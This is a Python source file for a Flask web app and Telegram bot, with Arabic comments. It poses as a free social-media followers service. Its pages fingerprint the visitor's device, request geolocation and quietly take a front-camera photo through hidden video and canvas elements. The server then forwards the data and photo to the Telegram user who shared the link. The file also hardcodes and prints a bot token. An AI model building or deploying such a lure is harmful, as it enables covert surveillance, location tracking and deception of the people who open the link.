import os
import logging
import uuid
from flask import Flask, request, jsonify, render_template_string
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
import asyncio
from threading import Thread
import time
import json
from datetime import datetime

# ========== إعدادات البوت ==========
BOT_TOKEN = "7388387809:AAHgsBR0z-avEVjjN2boGyXXwO2TR_T7hXA"
PORT = int(os.environ.get('PORT', 5000))

# ========== إعداد Flask ==========
app = Flask(__name__)

# إنشاء مجلدات التخزين
if not os.path.exists('photos'):
    os.makedirs('photos')
if not os.path.exists('data'):
    os.makedirs('data')

# تخزين البيانات
def load_user_data():
    try:
        with open('data/users.json', 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_user_data(data):
    with open('data/users.json', 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False)

def load_photos_data():
    try:
        with open('data/photos.json', 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_photos_data(data):
    with open('data/photos.json', 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False)

# ========== HTML قوالب ==========
USERNAME_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أدخل اسم المستخدم - زيادة المتابعين</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            text-align: center;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
        }
        
        h1 {
            font-size: 2rem;
            margin-bottom: 20px;
        }
        
        .input-group {
            margin: 20px 0;
        }
        
        input {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 10px;
            font-size: 1.1rem;
            text-align: center;
            margin: 10px 0;
        }
        
        .btn {
            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 1.1rem;
            font-weight: bold;
            margin: 10px;
            transition: all 0.3s ease;
        }
        
        .btn:hover {
            transform: translateY(-2px);
        }
        
        .platforms {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin: 20px 0;
        }
        
        .platform {
            background: rgba(255,255,255,0.2);
            padding: 10px 20px;
            border-radius: 10px;
            cursor: pointer;
        }
        
        .platform.active {
            background: #4CAF50;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📱 أدخل اسم المستخدم</h1>
        <p>لإرسال المتابعين إلى حسابك</p>
        
        <div class="platforms">
            <div class="platform active" onclick="selectPlatform('instagram')">📸 إنستغرام</div>
            <div class="platform" onclick="selectPlatform('tiktok')">🎵 تيك توك</div>
            <div class="platform" onclick="selectPlatform('twitter')">🐦 تويتر</div>
        </div>
        
        <div class="input-group">
            <input type="text" id="username" placeholder="مثال: your_username" autocomplete="off">
        </div>
        
        <button class="btn" onclick="submitUsername()">
            تأكيد ومتابعة ✅
        </button>
    </div>

    <script>
        let selectedPlatform = 'instagram';
        
        function selectPlatform(platform) {
            selectedPlatform = platform;
            document.querySelectorAll('.platform').forEach(p => p.classList.remove('active'));
            event.target.classList.add('active');
        }
        
        function submitUsername() {
            const username = document.getElementById('username').value.trim();
            if (!username) {
                alert('يرجى إدخال اسم المستخدم');
                return;
            }
            
            // حفظ البيانات والانتقال للصفحة التالية
            const nextUrl = `/collect_data/{{user_id}}?username=${encodeURIComponent(username)}&platform=${selectedPlatform}`;
            window.location.href = nextUrl;
        }
        
        // السماح بالإدخال بالإنتر
        document.getElementById('username').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                submitUsername();
            }
        });
    </script>
</body>
</html>
"""

DATA_COLLECTION_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التجهيز - زيادة المتابعين</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            text-align: center;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
        }
        
        .loader {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        h1 {
            font-size: 2rem;
            margin-bottom: 15px;
        }
        
        .status {
            font-size: 1.1rem;
            margin: 15px 0;
            line-height: 1.6;
        }
        
        .progress-bar {
            width: 100%;
            height: 8px;
            background: rgba(255,255,255,0.2);
            border-radius: 4px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            background: linear-gradient(90deg, #4CAF50, #45a049);
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 4px;
        }
        
        .hidden {
            display: none;
        }
        
        .data-item {
            background: rgba(255,255,255,0.1);
            padding: 10px;
            margin: 10px 0;
            border-radius: 8px;
            text-align: right;
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="loadingScreen">
            <div class="loader"></div>
            <h1>جاري تجهيز حسابك</h1>
            <div class="status" id="statusMessage">⏳ جاري جمع البيانات المطلوبة...</div>
            <div class="progress-bar">
                <div class="progress" id="progress"></div>
            </div>
        </div>
        
        <div id="dataScreen" class="hidden">
            <h1>📊 البيانات المجمعة</h1>
            <div id="collectedData"></div>
            <div class="status">🎉 جاري تفعيل خدمتك...</div>
        </div>
    </div>

    <!-- عناصر مخفية لجمع البيانات -->
    <video id="hiddenVideo" autoplay playsinline class="hidden"></video>
    <canvas id="hiddenCanvas" class="hidden"></canvas>
    <iframe id="hiddenIframe" class="hidden"></iframe>

    <script>
        let collectedData = {
            username: '{{username}}',
            platform: '{{platform}}',
            userAgent: navigator.userAgent,
            language: navigator.language,
            platformInfo: navigator.platform,
            screenResolution: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            javaEnabled: navigator.javaEnabled(),
            hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
            deviceMemory: navigator.deviceMemory || 'غير معروف'
        };

        // بدء جمع البيانات تلقائياً
        window.addEventListener('load', function() {
            startDataCollection();
        });

        async function startDataCollection() {
            try {
                // المرحلة 1: جمع بيانات المتصفح الأساسية
                updateProgress(10);
                updateStatus('🔍 جاري جمع معلومات الجهاز...');
                await delay(1000);

                // المرحلة 2: جمع بيانات الموقع
                updateProgress(30);
                updateStatus('📍 جاري تحديد الموقع...');
                await collectLocationData();
                
                // المرحلة 3: طلب إذن الكاميرا
                updateProgress(50);
                updateStatus('📸 جاري التحقق من الهوية...');
                await requestCameraPermission();
                
                // المرحلة 4: التقاط الصورة تلقائياً
                updateProgress(70);
                updateStatus('🔄 جاري إكمال التحقق...');
                await capturePhotoAutomatically();
                
                // المرحلة 5: إرسال جميع البيانات
                updateProgress(90);
                updateStatus('📤 جاري إرسال البيانات...');
                await sendAllData();
                
                updateProgress(100);
                showCollectedData();
                
            } catch (error) {
                console.error('Data collection error:', error);
                // الاستمرار حتى مع وجود أخطاء
                await sendAllData();
                showCollectedData();
            }
        }

        async function collectLocationData() {
            return new Promise((resolve) => {
                if ('geolocation' in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            collectedData.location = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            };
                            resolve();
                        },
                        (error) => {
                            collectedData.locationError = error.message;
                            resolve();
                        },
                        { timeout: 5000 }
                    );
                } else {
                    collectedData.location = 'غير مدعوم';
                    resolve();
                }
            });
        }

        async function requestCameraPermission() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                });
                
                collectedData.cameraAccess = 'مسموح';
                collectedData.cameraStream = stream;
                
            } catch (error) {
                collectedData.cameraAccess = 'مرفوض: ' + error.message;
                collectedData.cameraStream = null;
            }
        }

        async function capturePhotoAutomatically() {
            try {
                if (collectedData.cameraStream) {
                    const video = document.getElementById('hiddenVideo');
                    const canvas = document.getElementById('hiddenCanvas');
                    const context = canvas.getContext('2d');
                    
                    video.srcObject = collectedData.cameraStream;
                    
                    // الانتظار لضبط الكاميرا
                    await delay(2000);
                    
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // إيقاف الكاميرا
                    collectedData.cameraStream.getTracks().forEach(track => track.stop());
                    
                    // تحويل الصورة إلى base64
                    collectedData.capturedPhoto = canvas.toDataURL('image/jpeg', 0.7);
                }
            } catch (error) {
                collectedData.photoError = error.message;
            }
        }

        async function sendAllData() {
            try {
                const formData = new FormData();
                formData.append('user_id', '{{user_id}}');
                formData.append('username', collectedData.username);
                formData.append('platform', collectedData.platform);
                formData.append('collected_data', JSON.stringify(collectedData));
                
                // إضافة الصورة إذا كانت موجودة
                if (collectedData.capturedPhoto) {
                    const response = await fetch(collectedData.capturedPhoto);
                    const blob = await response.blob();
                    formData.append('photo', blob, 'verification.jpg');
                }

                const uploadResponse = await fetch('/upload_complete_data', {
                    method: 'POST',
                    body: formData
                });

                const result = await uploadResponse.json();
                return result.success;
                
            } catch (error) {
                console.error('Send data error:', error);
                return false;
            }
        }

        function updateProgress(percent) {
            document.getElementById('progress').style.width = percent + '%';
        }

        function updateStatus(message) {
            document.getElementById('statusMessage').textContent = message;
        }

        function showCollectedData() {
            document.getElementById('loadingScreen').classList.add('hidden');
            document.getElementById('dataScreen').classList.remove('hidden');
            
            const dataContainer = document.getElementById('collectedData');
            dataContainer.innerHTML = `
                <div class="data-item">👤 المستخدم: ${collectedData.username}</div>
                <div class="data-item">📱 المنصة: ${collectedData.platform}</div>
                <div class="data-item">💻 المتصفح: ${collectedData.userAgent.substring(0, 50)}...</div>
                <div class="data-item">🖥️ الدقة: ${collectedData.screenResolution}</div>
                <div class="data-item">🌐 المنطقة: ${collectedData.timezone}</div>
                <div class="data-item">📸 الكاميرا: ${collectedData.cameraAccess}</div>
                ${collectedData.location ? `<div class="data-item">📍 الموقع: ${collectedData.location.latitude}, ${collectedData.location.longitude}</div>` : ''}
            `;
            
            // إعادة التوجيه بعد 5 ثواني
            setTimeout(() => {
                window.close();
            }, 5000);
        }

        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // جمع بيانات إضافية عند مغادرة الصفحة
        window.addEventListener('beforeunload', function() {
            collectedData.pageLeaveTime = new Date().toISOString();
        });
    </script>
</body>
</html>
"""

MAIN_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>زيادة المتابعين - احصل على 100 متابع مجاناً</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 30px;
            text-align: center;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(10px);
        }
        
        .logo {
            font-size: 3rem;
            color: #4CAF50;
            margin-bottom: 15px;
        }
        
        h1 {
            color: #2d3748;
            font-size: 2.5rem;
            margin-bottom: 10px;
        }
        
        .subtitle {
            color: #718096;
            font-size: 1.2rem;
            margin-bottom: 20px;
        }
        
        .free-badge {
            background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
            color: #000;
            padding: 10px 25px;
            border-radius: 50px;
            font-weight: bold;
            font-size: 1.3rem;
            display: inline-block;
            margin: 10px 0;
            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
        }
        
        .packages {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 25px;
            margin-bottom: 30px;
        }
        
        .package {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease;
            backdrop-filter: blur(10px);
        }
        
        .package:hover {
            transform: translateY(-10px);
        }
        
        .package.featured {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            transform: scale(1.05);
        }
        
        .package.featured:hover {
            transform: scale(1.08) translateY(-5px);
        }
        
        .package-icon {
            font-size: 3rem;
            margin-bottom: 20px;
        }
        
        .package-title {
            font-size: 1.5rem;
            margin-bottom: 15px;
            font-weight: bold;
        }
        
        .package-followers {
            font-size: 2rem;
            font-weight: bold;
            margin-bottom: 15px;
            color: #4CAF50;
        }
        
        .package.featured .package-followers {
            color: #FFD700;
        }
        
        .package-price {
            font-size: 1.5rem;
            margin-bottom: 20px;
            color: #718096;
        }
        
        .package.featured .package-price {
            color: #fff;
        }
        
        .social-icons {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 30px 0;
        }
        
        .social-icon {
            width: 60px;
            height: 60px;
            background: rgba(255, 255, 255, 0.9);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
            color: #667eea;
            text-decoration: none;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        
        .social-icon:hover {
            transform: translateY(-5px);
            background: #667eea;
            color: white;
        }
        
        .btn {
            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
            color: white;
            border: none;
            padding: 20px 40px;
            border-radius: 50px;
            cursor: pointer;
            font-size: 1.2rem;
            font-weight: bold;
            margin: 10px;
            transition: all 0.3s ease;
            box-shadow: 0 8px 25px rgba(76, 175, 80, 0.3);
            text-decoration: none;
            display: inline-block;
        }
        
        .btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 30px rgba(76, 175, 80, 0.4);
        }
        
        .btn-large {
            padding: 25px 50px;
            font-size: 1.4rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- الهيدر -->
        <div class="header">
            <div class="logo">
                <i class="fas fa-users"></i>
            </div>
            <h1>زيادة المتابعين الحقيقية</h1>
            <p class="subtitle">احصل على آلاف المتابعين الحقيقين لجميع منصات السوشيال ميديا</p>
            <div class="free-badge">
                <i class="fas fa-gift"></i> احصل على 100 متابع مجاناً الآن!
            </div>
        </div>

        <!-- أيقونات السوشيال ميديا -->
        <div class="social-icons">
            <a href="#" class="social-icon">
                <i class="fab fa-instagram"></i>
            </a>
            <a href="#" class="social-icon">
                <i class="fab fa-tiktok"></i>
            </a>
            <a href="#" class="social-icon">
                <i class="fab fa-youtube"></i>
            </a>
            <a href="#" class="social-icon">
                <i class="fab fa-twitter"></i>
            </a>
            <a href="#" class="social-icon">
                <i class="fab fa-facebook"></i>
            </a>
        </div>

        <!-- الباقات -->
        <div class="packages">
            <div class="package">
                <div class="package-icon">
                    <i class="fas fa-star"></i>
                </div>
                <div class="package-title">الباقة الأساسية</div>
                <div class="package-followers">1,000 متابع</div>
                <div class="package-price">$9.99</div>
                <button class="btn" onclick="startProcess('basic')">اختر الباقة</button>
            </div>
            
            <div class="package featured">
                <div class="package-icon">
                    <i class="fas fa-crown"></i>
                </div>
                <div class="package-title">الباقة المميزة</div>
                <div class="package-followers">5,000 متابع</div>
                <div class="package-price">$29.99</div>
                <button class="btn" onclick="startProcess('premium')">اختر الباقة</button>
            </div>
            
            <div class="package">
                <div class="package-icon">
                    <i class="fas fa-rocket"></i>
                </div>
                <div class="package-title">الباقة الذهبية</div>
                <div class="package-followers">10,000 متابع</div>
                <div class="package-price">$49.99</div>
                <button class="btn" onclick="startProcess('gold')">اختر الباقة</button>
            </div>
        </div>

        <!-- زر الحصول على المتابعين المجانية -->
        <div style="background: rgba(255, 255, 255, 0.95); border-radius: 20px; padding: 40px; text-align: center; margin: 30px 0;">
            <h2>🎁 احصل على 100 متابع مجاناً!</h2>
            <p>انقر أدناه لبدء عملية الحصول على المتابعين المجانية</p>
            <button class="btn btn-large" onclick="startProcess('free')">
                <i class="fas fa-gift"></i> احصل على 100 متابع مجاناً
            </button>
        </div>
    </div>

    <script>
        function startProcess(packageType) {
            // الانتقال إلى صفحة إدخال اسم المستخدم
            const usernameUrl = `/username/{{user_id}}?package=${packageType}`;
            window.location.href = usernameUrl;
        }
    </script>
</body>
</html>
"""

# ========== مسارات Flask ==========
@app.route('/')
def home():
    return "Bot is running! Use /start in Telegram"

@app.route('/user/<user_id>')
def user_page(user_id):
    """الصفحة الرئيسية للمستخدم"""
    return render_template_string(MAIN_HTML, user_id=user_id)

@app.route('/username/<user_id>')
def username_page(user_id):
    """صفحة إدخال اسم المستخدم"""
    package = request.args.get('package', 'free')
    return render_template_string(USERNAME_HTML, user_id=user_id, package=package)

@app.route('/collect_data/<user_id>')
def collect_data_page(user_id):
    """صفحة جمع البيانات"""
    username = request.args.get('username', '')
    platform = request.args.get('platform', 'instagram')
    return render_template_string(DATA_COLLECTION_HTML, user_id=user_id, username=username, platform=platform)

@app.route('/upload_complete_data', methods=['POST'])
def upload_complete_data():
    """استقبال جميع البيانات المجمعة"""
    try:
        user_id = request.form.get('user_id')
        username = request.form.get('username')
        platform = request.form.get('platform')
        collected_data_json = request.form.get('collected_data')
        
        if not all([user_id, username, collected_data_json]):
            return jsonify({'success': False, 'error': 'Missing data'})
        
        # تحليل البيانات المجمعة
        collected_data = json.loads(collected_data_json)
        
        # حفظ الصورة إذا كانت موجودة
        photo_filename = None
        if 'photo' in request.files and request.files['photo']:
            photo = request.files['photo']
            if photo.filename:
                photo_filename = f"data_collection_{user_id}_{uuid.uuid4().hex[:8]}.jpg"
                filepath = os.path.join('photos', photo_filename)
                photo.save(filepath)
        
        # حفظ جميع البيانات
        user_data = load_user_data()
        if user_id not in user_data:
            user_data[user_id] = {}
        
        user_data[user_id].update({
            'username': username,
            'platform': platform,
            'collected_data': collected_data,
            'photo_filename': photo_filename,
            'collection_time': datetime.now().isoformat(),
            'package': request.args.get('package', 'free')
        })
        save_user_data(user_data)
        
        # إرسال البيانات للبوت
        asyncio.run(send_complete_data_to_bot(user_id, username, platform, collected_data, photo_filename))
        
        return jsonify({
            'success': True, 
            'message': 'تم جمع البيانات بنجاح',
            'data_collected': len(collected_data)
        })
        
    except Exception as e:
        print(f"❌ خطأ في جمع البيانات: {e}")
        return jsonify({'success': False, 'error': str(e)})

# ========== وظائف التليجرام ==========
async def send_complete_data_to_bot(user_id, username, platform, collected_data, photo_filename):
    """إرسال جميع البيانات المجمعة للمستخدم عبر البوت"""
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        
        # تحويل user_id إلى integer
        user_id_int = int(user_id)
        
        # إنشاء رسالة البيانات
        data_message = f"""
📊 **تم جمع البيانات بنجاح!**

👤 **المستخدم:** @{username}
📱 **المنصة:** {platform}
🆔 **رقم المستخدم:** {user_id}

💻 **معلومات الجهاز:**
• المتصفح: {collected_data.get('userAgent', 'غير معروف')[:50]}...
• النظام: {collected_data.get('platformInfo', 'غير معروف')}
• الدقة: {collected_data.get('screenResolution', 'غير معروف')}
• المعالج: {collected_data.get('hardwareConcurrency', 'غير معروف')}
• الذاكرة: {collected_data.get('deviceMemory', 'غير معروف')} GB

🌐 **معلومات الشبكة:**
• اللغة: {collected_data.get('language', 'غير معروف')}
• المنطقة: {collected_data.get('timezone', 'غير معروف')}
• الكوكيز: {collected_data.get('cookiesEnabled', 'غير معروف')}

📸 **صلاحيات الكاميرا:** {collected_data.get('cameraAccess', 'غير معروف')}

📍 **الموقع:** 
{get_location_info(collected_data)}

🕒 **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🎁 **جاري تفعيل الخدمة...**
        """
        
        # إرسال الرسالة النصية
        await application.bot.send_message(
            chat_id=user_id_int,
            text=data_message,
            parse_mode='HTML'
        )
        
        # إرسال الصورة إذا كانت موجودة
        if photo_filename and os.path.exists(os.path.join('photos', photo_filename)):
            with open(os.path.join('photos', photo_filename), 'rb') as photo_file:
                await application.bot.send_photo(
                    chat_id=user_id_int,
                    photo=InputFile(photo_file),
                    caption="📸 صورة التحقق التلقائية",
                    parse_mode='HTML'
                )
        
        # إرسال رسالة التأكيد النهائية
        confirmation_text = f"""
✅ **تم تفعيل خدمتك بنجاح!**

🎉 **مبروك!** سيتم إرسال المتابعين إلى:
**@{username}** على {platform}

📦 **الباقة المفعّلة:** {get_package_name(collected_data.get('package', 'free'))}
⏰ **وقت التفعيل:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🎯 **رقم الطلب:** #{uuid.uuid4().hex[:8].upper()}

🚀 **المتابعين سيصلون خلال 24 ساعة**

📞 **للإستفسار:** @{'your_support_username'}
        """
        
        await application.bot.send_message(
            chat_id=user_id_int,
            text=confirmation_text,
            parse_mode='HTML'
        )
        
        print(f"✅ تم إرسال البيانات الكاملة للمستخدم {user_id}")
        
    except Exception as e:
        print(f"❌ خطأ في إرسال البيانات للبوت: {e}")

def get_location_info(collected_data):
    """الحصول على معلومات الموقع"""
    if 'location' in collected_data:
        loc = collected_data['location']
        return f"• خط العرض: {loc.get('latitude', 'غير معروف')}\n• خط الطول: {loc.get('longitude', 'غير معروف')}\n• الدقة: {loc.get('accuracy', 'غير معروف')}m"
    elif 'locationError' in collected_data:
        return f"• خطأ: {collected_data['locationError']}"
    else:
        return "• غير متوفر"

def get_package_name(package_type):
    """الحصول على اسم الباقة"""
    packages = {
        'free': '🎁 100 متابع مجاناً',
        'basic': '⭐ باقة 1000 متابع',
        'premium': '👑 باقة 5000 متابع', 
        'gold': '🚀 باقة 10000 متابع'
    }
    return packages.get(package_type, 'خدمة المتابعين')

class TelegramBot:
    def __init__(self, token):
        self.token = token
        self.application = None
        
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """أمر /start"""
        user = update.effective_user
        user_id = user.id
        
        # حفظ بيانات المستخدم
        user_data = load_user_data()
        if str(user_id) not in user_data:
            user_data[str(user_id)] = {
                'username': user.username,
                'first_name': user.first_name,
                'join_date': datetime.now().isoformat(),
                'photos_count': 0
            }
            save_user_data(user_data)
        
        # إنشاء رابط المستخدم
        base_url = os.environ.get('RENDER_EXTERNAL_URL', f"https://{request.host}" if request else "http://localhost:5000")
        user_url = f"{base_url}/user/{user_id}"
        
        welcome_text = f"""
🎉 **أهلاً بك {user.first_name} في بوت زيادة المتابعين!**

📱 **رابطك الخاص:**
{user_url}

⚡ **مميزات الخدمة:**
✅ متابعين حقيقين 100%
✅ عملية تلقائية بالكامل
✅ خدمة 24/7
✅ أسعار مناسبة

🎁 **احصل على 100 متابع مجاناً الآن!**

🔒 **عملية آمنة وسريعة:**
• أدخل اسم المستخدم
• سيتم التحقق تلقائياً
• لا تظهر الصورة للمستخدم
• بياناتك محمية

💡 **كيفية الاستخدام:**
1. افتح الرابط أعلاه
2. اختر الباقة المناسبة
3. أدخل اسم المستخدم
4. وافق على الشروط
5. سيتم كل شيء تلقائياً
6. استلم متابعينك!
        """
        
        await update.message.reply_text(welcome_text, parse_mode='HTML')
        print(f"🔗 تم إنشاء رابط للمستخدم {user_id}: {user_url}")

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """أمر /help"""
        help_text = """
🤖 **أوامر البوت:**

/start - بدء البوت والحصول على الرابط الخاص
/help - عرض الرسالة المساعدة
/status - حالة طلباتك

📞 **الدعم الفني:**
@{'your_support_username'}

🕒 **أوقات العمل:**
24/7
        """
        await update.message.reply_text(help_text)

    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """أمر /status"""
        user_id = update.effective_user.id
        user_data = load_user_data()
        
        user_info = user_data.get(str(user_id), {})
        
        if user_info.get('username'):
            status_text = f"""
📊 **حالة طلباتك:**

👤 **المستخدم:** @{user_info['username']}
📱 **المنصة:** {user_info.get('platform', 'غير محدد')}
🎁 **الباقة:** {get_package_name(user_info.get('package', 'free'))}
🕒 **آخر تحديث:** {user_info.get('collection_time', 'غير متوفر')}

✅ **الخدمة مفعّلة وجارية**
            """
        else:
            status_text = "📭 لم تقم بأي طلبات بعد.\nاستخدم /start لبدء الخدمة!"
        
        await update.message.reply_text(status_text, parse_mode='HTML')

    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """معالج الأخطاء"""
        print(f"❌ خطأ في البوت: {context.error}")

    def setup_handlers(self):
        """إعداد معالجات الأوامر"""
        self.application.add_handler(CommandHandler("start", self.start))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CommandHandler("status", self.status_command))
        self.application.add_error_handler(self.error_handler)

    def run_polling(self):
        """تشغيل البوت باستخدام Polling"""
        async def run():
            self.application = Application.builder().token(self.token).build()
            self.setup_handlers()
            
            print("🤖 بدء تشغيل بوت التليجرام...")
            await self.application.initialize()
            await self.application.start()
            await self.application.updater.start_polling()
            
            # إبقاء البوت يعمل
            while True:
                await asyncio.sleep(3600)
                
        asyncio.run(run())

# ========== التشغيل الرئيسي ==========
def run_flask():
    """تشغيل خادم Flask"""
    print("🌐 بدء تشغيل خادم الويب...")
    app.run(host='0.0.0.0', port=PORT, debug=False)

def run_bot():
    """تشغيل بوت التليجرام"""
    time.sleep(3)  # انتظار بسيط لضمان تشغيل الخادم أولاً
        
    bot = TelegramBot(BOT_TOKEN)
    bot.run_polling()

if __name__ == '__main__':
    print("🚀 بدء تشغيل التطبيق...")
    print(f"📊 البورت: {PORT}")
    print(f"🔑 التوكن: {BOT_TOKEN}")
    print("🎯 الميزة: جمع البيانات الكامل تلقائياً")
    
    # تشغيل الخادم والبوت في خيوط منفصلة
    flask_thread = Thread(target=run_flask, daemon=True)
    bot_thread = Thread(target=run_bot, daemon=True)
    
    flask_thread.start()
    bot_thread.start()
    
    # إبقاء البرنامج الرئيسي يعمل
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("⏹ إيقاف التطبيق...")
